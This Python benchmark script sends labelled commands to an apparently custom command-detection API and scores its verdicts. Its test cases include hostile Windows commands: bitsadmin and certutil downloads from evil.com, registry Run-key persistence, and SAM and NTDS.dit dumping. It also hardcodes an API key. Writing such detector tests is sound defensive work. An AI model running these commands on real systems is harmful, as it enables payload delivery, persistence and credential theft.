import requests
import json
import time

# --- CONFIGURATION ---
API_URL = "https://l2w3b40t-5000.thundercompute.net/scan"
API_KEY = "GENOS_DEV_KEY_2026"

# Test cases: (Command, Description, Expected Verdict)
TEST_CASES = [
    # 1. LOLbins - Discovery (The new priority)
    ("nmap -sS -p 445 192.168.1.0/24", "Network Scanning (Nmap)", "Malicious"),
    ("net view /all /domain", "Domain Share Discovery", "Malicious"),
    ("arp -a", "Local ARP Table Recon", "Malicious"),
    ("netstat -ano | findstr LISTENING", "Port Discovery", "Malicious"),
    
    # 2. LOLbins - Persistence & Execution
    ("bitsadmin /transfer myDownloadJob /download /priority normal http://evil.com/a.exe C:\\temp\\a.exe", "BITSAdmin Download", "Malicious"),
    ("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Genos /t REG_SZ /d \"C:\\temp\\m.exe\"", "Registry RunKey Persistence", "Malicious"),
    ("certutil.exe -urlcache -split -f http://evil.com/p.exe", "Certutil Payload Download", "Malicious"),
    
    # 3. LOLbins - Credential Access
    ("reg save HKLM\\SAM C:\\temp\\sam.save", "SAM Hive Export (Cred Theft)", "Malicious"),
    ("esentutl.exe /y /v /ss C:\\windows\\ntds\\ntds.dit /d C:\\temp\\ntds.dit", "NTDS.dit Copy (AD Dumping)", "Malicious"),

    # 4. Pure Benign (The "FPR" Test)
    ("ipconfig /flushdns", "Standard Network Maintenance", "Benign"),
    ("df -h", "Disk Space Check (Linux-style/WSL)", "Benign"),
    ("Get-Service | Where-Object {$_.Status -eq 'Running'}", "PowerShell Service Audit", "Benign"),
    ("echo %COMPUTERNAME%", "Simple Environment Variable Check", "Benign")
]

def run_benchmark():
    print(f"{'='*80}")
    print(f"GENOS V1.0 COMPREHENSIVE BENCHMARK")
    print(f"Target: {API_URL}")
    print(f"{'='*80}\n")
    
    passed = 0
    total = len(TEST_CASES)

    for cmd, desc, expected in TEST_CASES:
        payload = {"command": cmd, "api_key": API_KEY}
        try:
            start_time = time.time()
            response = requests.post(API_URL, json=payload, timeout=10)
            latency = (time.time() - start_time) * 1000
            
            data = response.json()
            verdict = data.get("verdict", "ERROR")
            conf = data.get("confidence", 0.0)
            mitre = data.get("mitre_id", "N/A")

            # Determine Success
            is_success = (verdict == expected)
            if is_success: passed += 1
            
            status_char = "✅" if is_success else "❌"
            
            print(f"{status_char} [{desc}]")
            print(f"   CMD: {cmd}")
            print(f"   Result: {verdict} ({conf:.4f}) | MITRE: {mitre} | Latency: {latency:.1f}ms")
            print("-" * 40)

        except Exception as e:
            print(f"❌ Error testing '{desc}': {e}")

    print(f"\n{'='*80}")
    print(f"FINAL SCORE: {passed}/{total} ({(passed/total)*100:.2f}%)")
    print(f"{'='*80}")

if __name__ == "__main__":
    run_benchmark()